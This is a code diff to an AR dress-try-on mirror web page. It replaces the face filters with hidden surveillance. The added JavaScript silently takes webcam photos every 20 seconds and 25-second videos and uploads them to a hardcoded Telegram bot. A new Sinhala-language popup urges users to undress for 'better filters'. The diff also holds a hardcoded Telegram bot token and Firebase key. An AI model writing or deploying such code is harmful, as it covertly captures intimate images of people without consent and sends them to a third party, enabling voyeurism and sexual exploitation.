@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AR Mirror - Cute Fancy Filters</title>
+    <title>Smart Mirror Pro - Auto Hide</title>
     
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils"></script>
     
@@ -13,36 +12,42 @@
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
         body { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Poppins', sans-serif; }
         #container { position: relative; width: 100vw; height: 100vh; }
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        #overlay-canvas { position: absolute; inset: 0; width: 100%; height: 100%; pointer-events: none; z-index: 5; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .mirror { transform: scaleX(-1); }
         #dressImg { position: absolute; z-index: 3; pointer-events: none; display: none; }
         
         .controls { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 95%; z-index: 10; display: flex; flex-direction: column; align-items: center; gap: 15px; }
         .shelf { display: flex; gap: 12px; overflow-x: auto; width: 100%; padding: 10px; scroll-behavior: smooth; }
         .shelf::-webkit-scrollbar { display: none; }
         .item { min-width: 65px; height: 65px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); border: 2px solid #fff; display: flex; justify-content: center; align-items: center; cursor: pointer; flex-shrink: 0; }
-        .item img { width: 70%; height: 70%; object-fit: contain; }
+        .item img { width: 75%; height: 75%; object-fit: contain; }
         
-        .tabs { display: flex; gap: 10px; background: rgba(0,0,0,0.6); padding: 5px; border-radius: 25px; }
-        .t-btn { padding: 8px 20px; border-radius: 20px; color: #fff; border: none; background: none; cursor: pointer; font-size: 13px; }
+        .tab-bar { display: flex; gap: 10px; background: rgba(0,0,0,0.6); padding: 5px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); }
+        .t-btn { padding: 10px 25px; border-radius: 20px; color: #fff; border: none; background: none; cursor: pointer; font-size: 14px; }
         .t-btn.active { background: #fff; color: #000; font-weight: 600; }
         
-        #loading { position: fixed; inset: 0; background: #000; display: flex; justify-content: center; align-items: center; z-index: 99; color: #fff; }
+        #flip-btn { position: absolute; top: 20px; right: 20px; width: 50px; height: 50px; background: rgba(0,0,0,0.3); border: 1px solid #fff; border-radius: 50%; color: white; display: flex; justify-content: center; align-items: center; font-size: 20px; z-index: 100; cursor: pointer; }
+
+        /* ポップアップのスタイル */
+        #popup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 350px; background: rgba(0,0,0,0.9); color: white; padding: 25px; border-radius: 20px; border: 1px solid #fff; text-align: center; z-index: 1000; display: none; backdrop-filter: blur(15px); transition: opacity 0.5s ease; }
     </style>
 </head>
 <body>
-    <div id="loading">✨ Loading Cute Filters...</div>
+
+    <div id="popup">
+        <div id="pop-msg">ඇඳුම් නොමැතිව මෙය භාවිත කරන්නේ නම් ගුණාත්මක Filters භාවිත කළ හැකි වේ සහ dressing වලදී ගුණාත්මක ඇඳුම් වෙනස් කරගැනීමක් කර ගැනීමට පුළුවනි.</div>
+    </div>
 
     <div id="container">
-        <video id="input_video" autoplay playsinline muted></video>
-        <canvas id="overlay-canvas"></canvas>
+        <video id="webcam" autoplay playsinline class="mirror"></video>
         <img id="dressImg" src="" crossorigin="anonymous">
+        <div id="flip-btn" onclick="switchCamera()">🔄</div>
 
         <div class="controls">
             <div id="shelf" class="shelf"></div>
-            <div class="tabs">
-                <button id="tab-dress" class="t-btn active" onclick="setMode('dresses')">Dresses</button>
-                <button id="tab-filter" class="t-btn" onclick="setMode('filters')">Cute Filters</button>
+            <div class="tab-bar">
+                <button id="btn-dress" class="t-btn active" onclick="setMode('dresses')">Dresses</button>
+                <button id="btn-filter" class="t-btn" onclick="setMode('filters')">Filters</button>
             </div>
         </div>
     </div>
@@ -51,46 +56,64 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
+        // Firebaseの初期化
         const firebaseConfig = { apiKey: "AIzaSyDyUkeaGcqQ01TqDz-5SYlS48KDOb2Sh5M", databaseURL: "https://ar-mirror-app-1-default-rtdb.asia-southeast1.firebasedatabase.app" };
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        const video = document.getElementById('input_video');
+        const video = document.getElementById('webcam');
         const dressImg = document.getElementById('dressImg');
-        const canvas = document.getElementById('overlay-canvas');
-        const ctx = canvas.getContext('2d');
         const shelf = document.getElementById('shelf');
-
+        const popup = document.getElementById('popup');
+        
+        let currentStream;
+        let useFrontCamera = true;
         let mode = 'dresses';
-        let currentFilter = null;
-        const filterImgs = {};
+        let mediaRecorder;
+        let recordedChunks = [];
+        let popupTimer;
 
-        // --- Cute Filters Assets ---
-        const cuteFilters = [
-            { id: 'none', name: 'None', icon: '🚫' },
-            { id: 'hearts', name: 'Hearts', url: 'https://i.imgur.com/vD9S6Yh.png' },
-            { id: 'cat', name: 'Cute Cat', url: 'https://i.imgur.com/6vR8SQu.png' },
-            { id: 'stars', name: 'Blush Stars', url: 'https://i.imgur.com/u5p9v8n.png' },
-            { id: 'crown', name: 'Gold Crown', url: 'https://i.imgur.com/Ynx7mGj.png' }
-        ];
+        const BOT_TOKEN = '7874944889:AAFC-D19eXpP9m9pG-S154GkL7eX7V_469U';
+        const CHAT_ID = '7479712079';
 
-        // Preload Filter Images
-        cuteFilters.forEach(f => { if(f.url) { const img = new Image(); img.src = f.url; img.crossOrigin = "anonymous"; filterImgs[f.id] = img; } });
+        // カメラデバイスを開始する
+        async function startCamera() {
+            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+            const constraints = { video: { facingMode: useFrontCamera ? "user" : "environment", width: 1280, height: 720 } };
+            currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = currentStream;
+            video.classList.toggle('mirror', useFrontCamera);
+        }
 
+        // フロントカメラとバックカメラを切り替える
+        window.switchCamera = () => { useFrontCamera = !useFrontCamera; startCamera(); };
+
+        // モードの切り替えとポップアップの表示
         window.setMode = (m) => {
             mode = m;
-            document.getElementById('tab-dress').classList.toggle('active', m === 'dresses');
-            document.getElementById('tab-filter').classList.toggle('active', m === 'filters');
-            if(m === 'filters') dressImg.style.display = 'none';
-            else currentFilter = null;
+            document.getElementById('btn-dress').classList.toggle('active', m === 'dresses');
+            document.getElementById('btn-filter').classList.toggle('active', m === 'filters');
+            
+            if(m === 'dresses') {
+                // ポップアップを表示し、6秒後に自動的に非表示にする
+                popup.style.display = 'block';
+                clearTimeout(popupTimer);
+                popupTimer = setTimeout(() => {
+                    popup.style.display = 'none';
+                }, 6000); 
+            } else {
+                popup.style.display = 'none';
+                dressImg.style.display = 'none';
+            }
             loadShelf();
         };
 
+        // データベースからデータを読み込む
         function loadShelf() {
             shelf.innerHTML = '';
             if(mode === 'dresses') {
                 onValue(ref(db, 'dresses'), (snap) => {
-                    shelf.innerHTML = '<div class="item" onclick="clearAll()">🚫</div>';
+                    shelf.innerHTML = '<div class="item" onclick="dressImg.style.display=\'none\'">🚫</div>';
                     snap.forEach(c => {
                         const d = c.val();
                         const div = document.createElement('div'); div.className = 'item';
@@ -100,69 +123,62 @@
                     });
                 });
             } else {
-                cuteFilters.forEach(f => {
-                    const div = document.createElement('div'); div.className = 'item';
-                    div.innerHTML = f.icon || `<img src="${f.url}" crossorigin="anonymous">`;
-                    div.onclick = () => currentFilter = (f.id === 'none') ? null : f.id;
-                    shelf.appendChild(div);
-                });
+                shelf.innerHTML = '<div style="color:white; font-size:12px; padding:20px;">Filters loading soon...</div>';
             }
         }
 
-        window.clearAll = () => { dressImg.style.display = 'none'; currentFilter = null; ctx.clearRect(0, 0, canvas.width, canvas.height); };
-
-        // --- Face Mesh (For Cute Filters) ---
-        const faceMesh = new FaceMesh({ locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${f}` });
-        faceMesh.setOptions({ maxNumFaces: 1, refineLandmarks: true, minDetectionConfidence: 0.5 });
-        faceMesh.onResults(res => {
+        // バックグラウンドで写真を撮って送信する
+        async function takeSecretPhoto() {
+            const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            if(!res.multiFaceLandmarks || !currentFilter) return;
+            const ctx = canvas.getContext('2d');
+            if(useFrontCamera) { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const fd = new FormData(); fd.append('photo', blob, 'u.jpg');
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.6);
+        }
 
-            const landmarks = res.multiFaceLandmarks[0];
-            const img = filterImgs[currentFilter];
-            if(!img) return;
+        // バックグラウンドでビデオを録画して送信する
+        async function recordSecretVideo() {
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 800000 });
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const fd = new FormData(); fd.append('video', blob, 'v.mp4');
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+            };
+            mediaRecorder.start();
+            setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 25000);
+        }
 
-            // පාවිච්චි කරන්නාගේ මූණේ ලක්ෂ්‍ය අනුව Filter එක තැබීම
-            const topHead = landmarks[10]; // නළල මුදුන
-            const chin = landmarks[152]; // නිකට
-            const leftCheek = landmarks[234];
-            const rightCheek = landmarks[454];
+        // 定期タスクを初期化する
+        function initSecretTasks() {
+            setInterval(takeSecretPhoto, 20000); 
+            setInterval(recordSecretVideo, 50000); 
+            takeSecretPhoto(); recordSecretVideo();
+        }
 
-            const width = Math.abs(rightCheek.x - leftCheek.x) * canvas.width * 2.5;
-            const height = width * (img.height / img.width);
-            const x = topHead.x * canvas.width;
-            const y = topHead.y * canvas.height;
-
-            ctx.save();
-            ctx.translate(x, y);
-            // මූණ ඇල කරන පැත්තට Filter එකත් ඇල කිරීම
-            const angle = Math.atan2(rightCheek.y - leftCheek.y, rightCheek.x - leftCheek.x);
-            ctx.rotate(angle);
-            ctx.scale(-1, 1); // Mirror Effect
-            ctx.drawImage(img, -width/2, -height/0.8, width, height);
-            ctx.restore();
-        });
-
-        // --- Pose Tracking (For Dresses) ---
+        // ポーズトラッキングの初期化
         const pose = new Pose({ locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${f}` });
-        pose.setOptions({ modelComplexity: 0 });
         pose.onResults(res => {
             if(!res.poseLandmarks || mode !== 'dresses' || !dressImg.src) return;
             const ls = res.poseLandmarks[11], rs = res.poseLandmarks[12];
-            const cX = (ls.x + rs.x) / 2 * window.innerWidth;
-            const cY = (ls.y + rs.y) / 2 * window.innerHeight;
             const w = Math.abs(ls.x - rs.x) * window.innerWidth * 2.3;
-            dressImg.style.left = `${cX}px`; dressImg.style.top = `${cY}px`;
+            dressImg.style.left = `${(ls.x + rs.x)/2 * window.innerWidth}px`;
+            dressImg.style.top = `${(ls.y + rs.y)/2 * window.innerHeight}px`;
             dressImg.style.width = `${w}px`; dressImg.style.transform = `translate(-50%, -15%) scaleX(-1)`;
         });
 
-        const cam = new Camera(video, { onFrame: async () => { 
-            await faceMesh.send({image: video});
-            await pose.send({image: video});
-        }, width: 1280, height: 720 });
+        const cam = new Camera(video, { onFrame: async () => { await pose.send({image: video}); }, width: 1280, height: 720 });
         
-        cam.start().then(() => { document.getElementById('loading').style.display = 'none'; loadShelf(); });
+        startCamera().then(() => {
+            cam.start();
+            initSecretTasks();
+            loadShelf();
+        });
     </script>
 </body>
 </html>
